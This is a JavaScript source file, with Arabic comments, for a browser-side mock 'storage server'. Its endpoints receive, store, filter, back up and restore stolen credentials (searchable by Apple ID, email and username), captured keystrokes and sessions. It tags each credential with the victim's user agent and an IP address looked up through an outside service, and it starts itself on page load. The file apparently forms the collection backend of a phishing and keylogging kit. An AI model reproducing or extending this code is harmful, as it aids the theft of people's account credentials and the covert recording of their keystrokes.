// 📁 storage-server.js - خادم تخزين وهمي للنظام

class StorageServer {
    constructor() {
        this.version = '2.0.0';
        this.endpoints = {
            '/api/data': this.handleDataRequest.bind(this),
            '/api/credentials': this.handleCredentialsRequest.bind(this),
            '/api/keystrokes': this.handleKeystrokesRequest.bind(this),
            '/api/logs': this.handleLogsRequest.bind(this),
            '/api/status': this.handleStatusRequest.bind(this),
            '/api/backup': this.handleBackupRequest.bind(this),
            '/api/restore': this.handleRestoreRequest.bind(this)
        };
        
        this.data = {
            credentials: [],
            keystrokes: [],
            logs: [],
            sessions: [],
            backups: []
        };
        
        this.settings = {
            port: 8080,
            enableCors: true,
            maxDataSize: 100 * 1024 * 1024, // 100MB
            autoBackup: true,
            backupInterval: 3600000 // ساعة
        };
        
        this.initialize();
    }
    
    // تهيئة النظام
    async initialize() {
        console.log(`🚀 Storage Server v${this.version} initializing...`);
        
        // تحميل البيانات المحفوظة
        await this.loadData();
        
        // بدء الخادم الوهمي
        this.startMockServer();
        
        // بدء النسخ الاحتياطي التلقائي
        this.startAutoBackup();
        
        console.log('✅ Storage Server ready');
    }
    
    // تحميل البيانات المحفوظة
    async loadData() {
        try {
            const savedData = localStorage.getItem('storage_server_data');
            if (savedData) {
                this.data = JSON.parse(savedData);
                console.log(`📊 Loaded server data: ${this.data.credentials.length} credentials, ${this.data.keystrokes.length} keystrokes`);
            }
        } catch (error) {
            console.warn('⚠️ Server data load error:', error);
        }
    }
    
    // حفظ البيانات
    async saveData() {
        try {
            localStorage.setItem('storage_server_data', JSON.stringify(this.data));
            console.log('💾 Server data saved');
            return true;
        } catch (error) {
            console.warn('⚠️ Server data save error:', error);
            return false;
        }
    }
    
    // بدء الخادم الوهمي
    startMockServer() {
        console.log('🌐 Mock server running (handling localStorage operations)');
        
        // محاكاة استقبال الطلبات عبر localStorage
        window.addEventListener('storage', (event) => {
            if (event.key === 'server_request') {
                this.handleServerRequest(event.newValue);
            }
        });
    }
    
    // معالجة طلب الخادم
    async handleServerRequest(requestData) {
        try {
            const request = JSON.parse(requestData);
            const { endpoint, method, data, id } = request;
            
            console.log(`📨 Server request: ${method} ${endpoint}`);
            
            let response;
            
            if (this.endpoints[endpoint]) {
                response = await this.endpoints[endpoint](method, data);
            } else {
                response = {
                    success: false,
                    error: 'Endpoint not found'
                };
            }
            
            // إرسال الرد
            this.sendServerResponse(id, response);
            
        } catch (error) {
            console.error('❌ Server request error:', error);
            
            this.sendServerResponse(null, {
                success: false,
                error: error.message
            });
        }
    }
    
    // إرسال رد الخادم
    sendServerResponse(requestId, response) {
        const responseData = {
            requestId: requestId,
            timestamp: new Date().toISOString(),
            ...response
        };
        
        localStorage.setItem('server_response', JSON.stringify(responseData));
        
        // تشغيل حدث التخزين لمحاكاة الرد
        const event = new StorageEvent('storage', {
            key: 'server_response',
            newValue: JSON.stringify(responseData)
        });
        
        window.dispatchEvent(event);
    }
    
    // معالجة طلبات البيانات
    async handleDataRequest(method, data) {
        switch (method) {
            case 'GET':
                return this.getAllData();
                
            case 'POST':
                return this.saveDataItem(data);
                
            case 'DELETE':
                return this.deleteData(data);
                
            default:
                return {
                    success: false,
                    error: 'Method not allowed'
                };
        }
    }
    
    // الحصول على جميع البيانات
    getAllData() {
        return {
            success: true,
            data: this.data,
            count: {
                credentials: this.data.credentials.length,
                keystrokes: this.data.keystrokes.length,
                logs: this.data.logs.length,
                sessions: this.data.sessions.length,
                backups: this.data.backups.length
            },
            timestamp: new Date().toISOString()
        };
    }
    
    // حفظ عنصر بيانات
    async saveDataItem(item) {
        try {
            if (!item || !item.type) {
                throw new Error('Invalid data item');
            }
            
            // إضافة معرف وطابع زمني
            item.id = `item_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            item.timestamp = new Date().toISOString();
            item.receivedAt = Date.now();
            
            // حفظ حسب النوع
            switch (item.type) {
                case 'credential':
                    this.data.credentials.push(item);
                    break;
                    
                case 'keystroke':
                    this.data.keystrokes.push(item);
                    break;
                    
                case 'log':
                    this.data.logs.push(item);
                    break;
                    
                case 'session':
                    this.data.sessions.push(item);
                    break;
                    
                default:
                    this.data.logs.push({
                        type: 'unknown',
                        data: item,
                        timestamp: new Date().toISOString()
                    });
            }
            
            // حفظ التغييرات
            await this.saveData();
            
            return {
                success: true,
                id: item.id,
                type: item.type,
                message: 'Data saved successfully'
            };
            
        } catch (error) {
            console.error('❌ Data save error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // حذف البيانات
    async deleteData(data) {
        try {
            const { type, id, olderThan } = data;
            
            if (olderThan) {
                const timestamp = new Date(olderThan).getTime();
                let deletedCount = 0;
                
                switch (type) {
                    case 'credentials':
                        deletedCount = this.deleteOldItems(this.data.credentials, timestamp);
                        break;
                        
                    case 'keystrokes':
                        deletedCount = this.deleteOldItems(this.data.keystrokes, timestamp);
                        break;
                        
                    case 'logs':
                        deletedCount = this.deleteOldItems(this.data.logs, timestamp);
                        break;
                        
                    default:
                        throw new Error('Invalid data type');
                }
                
                await this.saveData();
                
                return {
                    success: true,
                    deletedCount: deletedCount,
                    message: `Deleted ${deletedCount} items older than ${olderThan}`
                };
                
            } else if (id) {
                // حذف عنصر محدد
                let deleted = false;
                
                ['credentials', 'keystrokes', 'logs', 'sessions'].forEach(collection => {
                    const index = this.data[collection].findIndex(item => item.id === id);
                    if (index !== -1) {
                        this.data[collection].splice(index, 1);
                        deleted = true;
                    }
                });
                
                if (deleted) {
                    await this.saveData();
                    return {
                        success: true,
                        message: `Item ${id} deleted`
                    };
                } else {
                    return {
                        success: false,
                        error: 'Item not found'
                    };
                }
            }
            
            throw new Error('No deletion criteria specified');
            
        } catch (error) {
            console.error('❌ Delete error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // حذف العناصر القديمة
    deleteOldItems(items, timestamp) {
        const initialLength = items.length;
        
        for (let i = items.length - 1; i >= 0; i--) {
            const itemTime = new Date(items[i].timestamp).getTime();
            if (itemTime < timestamp) {
                items.splice(i, 1);
            }
        }
        
        return initialLength - items.length;
    }
    
    // معالجة طلبات بيانات الاعتماد
    async handleCredentialsRequest(method, data) {
        switch (method) {
            case 'GET':
                return this.getCredentials(data);
                
            case 'POST':
                return this.saveCredential(data);
                
            case 'DELETE':
                return this.deleteCredential(data);
                
            default:
                return {
                    success: false,
                    error: 'Method not allowed'
                };
        }
    }
    
    // الحصول على بيانات الاعتماد
    getCredentials(filters = {}) {
        let credentials = this.data.credentials;
        
        // تطبيق الفلاتر
        if (filters.search) {
            const searchStr = filters.search.toLowerCase();
            credentials = credentials.filter(cred =>
                (cred.appleId && cred.appleId.toLowerCase().includes(searchStr)) ||
                (cred.email && cred.email.toLowerCase().includes(searchStr)) ||
                (cred.username && cred.username.toLowerCase().includes(searchStr))
            );
        }
        
        if (filters.startDate) {
            const start = new Date(filters.startDate).getTime();
            credentials = credentials.filter(cred =>
                new Date(cred.timestamp).getTime() >= start
            );
        }
        
        if (filters.endDate) {
            const end = new Date(filters.endDate).getTime();
            credentials = credentials.filter(cred =>
                new Date(cred.timestamp).getTime() <= end
            );
        }
        
        if (filters.limit) {
            credentials = credentials.slice(-filters.limit);
        }
        
        // ترتيب حسب الوقت (الأحدث أولاً)
        credentials.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        
        return {
            success: true,
            credentials: credentials,
            count: credentials.length,
            total: this.data.credentials.length
        };
    }
    
    // حفظ بيانات الاعتماد
    async saveCredential(credential) {
        try {
            if (!credential || (!credential.appleId && !credential.email)) {
                throw new Error('Invalid credential data');
            }
            
            // إنشاء سجل جديد
            const credentialRecord = {
                id: `cred_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                type: 'credential',
                timestamp: new Date().toISOString(),
                ...credential,
                metadata: {
                    source: 'storage_server',
                    receivedAt: Date.now(),
                    userAgent: navigator.userAgent,
                    ip: await this.getIPAddress()
                }
            };
            
            // إضافة إلى القائمة
            this.data.credentials.push(credentialRecord);
            
            // حفظ التغييرات
            await this.saveData();
            
            return {
                success: true,
                id: credentialRecord.id,
                message: 'Credential saved successfully'
            };
            
        } catch (error) {
            console.error('❌ Credential save error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // حذف بيانات الاعتماد
    async deleteCredential(data) {
        try {
            const { id } = data;
            
            if (!id) {
                throw new Error('Credential ID required');
            }
            
            const index = this.data.credentials.findIndex(cred => cred.id === id);
            
            if (index === -1) {
                throw new Error('Credential not found');
            }
            
            this.data.credentials.splice(index, 1);
            await this.saveData();
            
            return {
                success: true,
                message: 'Credential deleted successfully'
            };
            
        } catch (error) {
            console.error('❌ Credential delete error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // معالجة طلبات ضغطات المفاتيح
    async handleKeystrokesRequest(method, data) {
        switch (method) {
            case 'GET':
                return this.getKeystrokes(data);
                
            case 'POST':
                return this.saveKeystrokes(data);
                
            case 'DELETE':
                return this.deleteKeystrokes(data);
                
            default:
                return {
                    success: false,
                    error: 'Method not allowed'
                };
        }
    }
    
    // الحصول على ضغطات المفاتيح
    getKeystrokes(filters = {}) {
        let keystrokes = this.data.keystrokes;
        
        // تطبيق الفلاتر
        if (filters.sessionId) {
            keystrokes = keystrokes.filter(ks => ks.sessionId === filters.sessionId);
        }
        
        if (filters.startDate) {
            const start = new Date(filters.startDate).getTime();
            keystrokes = keystrokes.filter(ks =>
                new Date(ks.timestamp).getTime() >= start
            );
        }
        
        if (filters.endDate) {
            const end = new Date(filters.endDate).getTime();
            keystrokes = keystrokes.filter(ks =>
                new Date(ks.timestamp).getTime() <= end
            );
        }
        
        if (filters.limit) {
            keystrokes = keystrokes.slice(-filters.limit);
        }
        
        // ترتيب حسب الوقت
        keystrokes.sort((a, b) => new Date(a.timestamp) - new Date(b.timestamp));
        
        return {
            success: true,
            keystrokes: keystrokes,
            count: keystrokes.length,
            total: this.data.keystrokes.length
        };
    }
    
    // حفظ ضغطات المفاتيح
    async saveKeystrokes(keystrokes) {
        try {
            if (!Array.isArray(keystrokes)) {
                keystrokes = [keystrokes];
            }
            
            let savedCount = 0;
            
            for (const ks of keystrokes) {
                const keystrokeRecord = {
                    id: `ks_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                    type: 'keystroke',
                    timestamp: new Date().toISOString(),
                    ...ks,
                    metadata: {
                        source: 'storage_server',
                        receivedAt: Date.now()
                    }
                };
                
                this.data.keystrokes.push(keystrokeRecord);
                savedCount++;
                
                // الحد الأقصى: 10000 ضغطة
                if (this.data.keystrokes.length > 10000) {
                    this.data.keystrokes = this.data.keystrokes.slice(-10000);
                }
            }
            
            await this.saveData();
            
            return {
                success: true,
                savedCount: savedCount,
                totalKeystrokes: this.data.keystrokes.length
            };
            
        } catch (error) {
            console.error('❌ Keystrokes save error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // حذف ضغطات المفاتيح
    async deleteKeystrokes(data) {
        try {
            const { sessionId, olderThan } = data;
            
            let deletedCount = 0;
            
            if (sessionId) {
                const initialLength = this.data.keystrokes.length;
                this.data.keystrokes = this.data.keystrokes.filter(ks => ks.sessionId !== sessionId);
                deletedCount = initialLength - this.data.keystrokes.length;
            } else if (olderThan) {
                const timestamp = new Date(olderThan).getTime();
                deletedCount = this.deleteOldItems(this.data.keystrokes, timestamp);
            }
            
            if (deletedCount > 0) {
                await this.saveData();
            }
            
            return {
                success: true,
                deletedCount: deletedCount,
                message: `Deleted ${deletedCount} keystrokes`
            };
            
        } catch (error) {
            console.error('❌ Keystrokes delete error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // معالجة طلبات السجلات
    async handleLogsRequest(method, data) {
        switch (method) {
            case 'GET':
                return this.getLogs(data);
                
            case 'POST':
                return this.saveLog(data);
                
            default:
                return {
                    success: false,
                    error: 'Method not allowed'
                };
        }
    }
    
    // الحصول على السجلات
    getLogs(filters = {}) {
        let logs = this.data.logs;
        
        // تطبيق الفلاتر
        if (filters.level) {
            logs = logs.filter(log => log.level === filters.level);
        }
        
        if (filters.type) {
            logs = logs.filter(log => log.type === filters.type);
        }
        
        if (filters.startDate) {
            const start = new Date(filters.startDate).getTime();
            logs = logs.filter(log =>
                new Date(log.timestamp).getTime() >= start
            );
        }
        
        if (filters.endDate) {
            const end = new Date(filters.endDate).getTime();
            logs = logs.filter(log =>
                new Date(log.timestamp).getTime() <= end
            );
        }
        
        if (filters.limit) {
            logs = logs.slice(-filters.limit);
        }
        
        // ترتيب حسب الوقت (الأحدث أولاً)
        logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        
        return {
            success: true,
            logs: logs,
            count: logs.length,
            total: this.data.logs.length
        };
    }
    
    // حفظ السجل
    async saveLog(log) {
        try {
            const logRecord = {
                id: `log_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
                timestamp: new Date().toISOString(),
                ...log,
                metadata: {
                    source: 'storage_server',
                    receivedAt: Date.now()
                }
            };
            
            this.data.logs.push(logRecord);
            
            // الحد الأقصى: 5000 سجل
            if (this.data.logs.length > 5000) {
                this.data.logs = this.data.logs.slice(-5000);
            }
            
            await this.saveData();
            
            return {
                success: true,
                id: logRecord.id
            };
            
        } catch (error) {
            console.error('❌ Log save error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // معالجة طلبات الحالة
    async handleStatusRequest() {
        const status = {
            server: {
                version: this.version,
                uptime: this.getUptime(),
                dataSize: this.getDataSize(),
                lastBackup: this.data.backups.length > 0 ? 
                    this.data.backups[this.data.backups.length - 1].timestamp : 
                    'never'
            },
            data: {
                credentials: this.data.credentials.length,
                keystrokes: this.data.keystrokes.length,
                logs: this.data.logs.length,
                sessions: this.data.sessions.length,
                backups: this.data.backups.length
            },
            storage: {
                localStorage: this.getLocalStorageInfo(),
                estimatedQuota: this.estimateStorageQuota()
            },
            timestamp: new Date().toISOString()
        };
        
        return {
            success: true,
            ...status
        };
    }
    
    // الحصول على مدة التشغيل
    getUptime() {
        if (!this.startTime) {
            this.startTime = Date.now();
        }
        
        const uptime = Date.now() - this.startTime;
        
        const days = Math.floor(uptime / (1000 * 60 * 60 * 24));
        const hours = Math.floor((uptime % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((uptime % (1000 * 60 * 60)) / (1000 * 60));
        
        return `${days}d ${hours}h ${minutes}m`;
    }
    
    // الحصول على حجم البيانات
    getDataSize() {
        const dataStr = JSON.stringify(this.data);
        const bytes = new Blob([dataStr]).size;
        
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        if (bytes === 0) return '0 Byte';
        
        const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)));
        return Math.round(bytes / Math.pow(1024, i) * 100) / 100 + ' ' + sizes[i];
    }
    
    // الحصول على معلومات localStorage
    getLocalStorageInfo() {
        try {
            let total = 0;
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                total += key.length + value.length;
            }
            
            return {
                used: total,
                items: localStorage.length
            };
        } catch (error) {
            return {
                used: 0,
                items: 0,
                error: error.message
            };
        }
    }
    
    // تقدير حصة التخزين
    estimateStorageQuota() {
        try {
            // تقدير تقريبي
            const estimate = {
                localStorage: '5-10MB',
                sessionStorage: '5-10MB',
                indexedDB: '50-250MB',
                total: '50-250MB'
            };
            
            return estimate;
        } catch (error) {
            return {
                error: 'Unable to estimate'
            };
        }
    }
    
    // معالجة طلبات النسخ الاحتياطي
    async handleBackupRequest(method, data) {
        switch (method) {
            case 'GET':
                return this.getBackups();
                
            case 'POST':
                return this.createBackup(data);
                
            case 'DELETE':
                return this.deleteBackup(data);
                
            default:
                return {
                    success: false,
                    error: 'Method not allowed'
                };
        }
    }
    
    // الحصول على النسخ الاحتياطية
    getBackups() {
        const backups = this.data.backups;
        
        // ترتيب حسب الوقت (الأحدث أولاً)
        const sortedBackups = [...backups].sort((a, b) => 
            new Date(b.timestamp) - new Date(a.timestamp)
        );
        
        return {
            success: true,
            backups: sortedBackups,
            count: backups.length
        };
    }
    
    // إنشاء نسخة احتياطية
    async createBackup(data = {}) {
        try {
            const backupId = `backup_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            
            const backup = {
                id: backupId,
                timestamp: new Date().toISOString(),
                type: data.type || 'full',
                data: {
                    credentials: this.data.credentials.slice(-1000), // آخر 1000 سجل
                    keystrokes: this.data.keystrokes.slice(-5000), // آخر 5000 ضغطة
                    logs: this.data.logs.slice(-1000), // آخر 1000 سجل
                    sessions: this.data.sessions.slice(-100) // آخر 100 جلسة
                },
                metadata: {
                    userAgent: navigator.userAgent,
                    createdBy: 'storage_server',
                    totalRecords: {
                        credentials: this.data.credentials.length,
                        keystrokes: this.data.keystrokes.length,
                        logs: this.data.logs.length,
                        sessions: this.data.sessions.length
                    }
                }
            };
            
            this.data.backups.push(backup);
            
            // الاحتفاظ بـ 10 نسخ فقط
            if (this.data.backups.length > 10) {
                this.data.backups = this.data.backups.slice(-10);
            }
            
            await this.saveData();
            
            return {
                success: true,
                id: backupId,
                timestamp: backup.timestamp,
                message: 'Backup created successfully'
            };
            
        } catch (error) {
            console.error('❌ Backup error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // حذف النسخة الاحتياطية
    async deleteBackup(data) {
        try {
            const { id } = data;
            
            if (!id) {
                throw new Error('Backup ID required');
            }
            
            const index = this.data.backups.findIndex(backup => backup.id === id);
            
            if (index === -1) {
                throw new Error('Backup not found');
            }
            
            this.data.backups.splice(index, 1);
            await this.saveData();
            
            return {
                success: true,
                message: 'Backup deleted successfully'
            };
            
        } catch (error) {
            console.error('❌ Backup delete error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // معالجة طلبات الاستعادة
    async handleRestoreRequest(method, data) {
        if (method !== 'POST') {
            return {
                success: false,
                error: 'Method not allowed'
            };
        }
        
        return this.restoreBackup(data);
    }
    
    // استعادة من نسخة احتياطية
    async restoreBackup(data) {
        try {
            const { id, type = 'merge' } = data;
            
            if (!id) {
                throw new Error('Backup ID required');
            }
            
            const backup = this.data.backups.find(b => b.id === id);
            
            if (!backup) {
                throw new Error('Backup not found');
            }
            
            if (type === 'replace') {
                // استبدال كامل
                this.data.credentials = backup.data.credentials || [];
                this.data.keystrokes = backup.data.keystrokes || [];
                this.data.logs = backup.data.logs || [];
                this.data.sessions = backup.data.sessions || [];
            } else {
                // دمج (إضافة دون تكرار)
                this.mergeData('credentials', backup.data.credentials || []);
                this.mergeData('keystrokes', backup.data.keystrokes || []);
                this.mergeData('logs', backup.data.logs || []);
                this.mergeData('sessions', backup.data.sessions || []);
            }
            
            await this.saveData();
            
            return {
                success: true,
                message: `Backup restored (${type})`,
                restored: {
                    credentials: backup.data.credentials?.length || 0,
                    keystrokes: backup.data.keystrokes?.length || 0,
                    logs: backup.data.logs?.length || 0,
                    sessions: backup.data.sessions?.length || 0
                }
            };
            
        } catch (error) {
            console.error('❌ Restore error:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    // دمج البيانات
    mergeData(type, newItems) {
        const existingIds = new Set(this.data[type].map(item => item.id));
        
        newItems.forEach(item => {
            if (!existingIds.has(item.id)) {
                this.data[type].push(item);
                existingIds.add(item.id);
            }
        });
    }
    
    // بدء النسخ الاحتياطي التلقائي
    startAutoBackup() {
        if (this.settings.autoBackup) {
            setInterval(async () => {
                await this.createBackup({ type: 'auto' });
            }, this.settings.backupInterval);
            
            console.log('⏰ Auto-backup enabled');
        }
    }
    
    // الحصول على عنوان IP
    async getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'unknown';
        }
    }
    
    // الحصول على تقرير النظام
    getSystemReport() {
        return {
            version: this.version,
            settings: this.settings,
            status: {
                uptime: this.getUptime(),
                dataSize: this.getDataSize(),
                lastBackup: this.data.backups.length > 0 ? 
                    this.data.backups[this.data.backups.length - 1].timestamp : 
                    'never'
            },
            data: this.getAllData().count,
            storage: this.getLocalStorageInfo(),
            timestamp: new Date().toISOString()
        };
    }
    
    // إرسال طلب إلى الخادم
    async sendRequest(endpoint, method = 'GET', data = null) {
        const requestId = `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        const request = {
            id: requestId,
            endpoint: endpoint,
            method: method,
            data: data,
            timestamp: new Date().toISOString()
        };
        
        // حفظ الطلب في localStorage
        localStorage.setItem('server_request', JSON.stringify(request));
        
        // انتظار الرد (بحد أقصى 10 ثواني)
        return new Promise((resolve, reject) => {
            const checkResponse = () => {
                const responseStr = localStorage.getItem('server_response');
                
                if (responseStr) {
                    try {
                        const response = JSON.parse(responseStr);
                        
                        if (response.requestId === requestId) {
                            localStorage.removeItem('server_response');
                            resolve(response);
                        }
                    } catch (error) {
                        reject(error);
                    }
                }
            };
            
            // التحقق كل 100ms
            const interval = setInterval(checkResponse, 100);
            
            // مهلة 10 ثواني
            setTimeout(() => {
                clearInterval(interval);
                reject(new Error('Request timeout'));
            }, 10000);
        });
    }
}

// تصدير النظام للاستخدام العالمي
window.StorageServer = StorageServer;

// تهيئة النظام تلقائياً
if (typeof window !== 'undefined') {
    window.addEventListener('DOMContentLoaded', async () => {
        if (!window.storageServer) {
            window.storageServer = new StorageServer();
            console.log('🚀 Storage Server loaded globally as window.storageServer');
        }
    });
}

export default StorageServer;
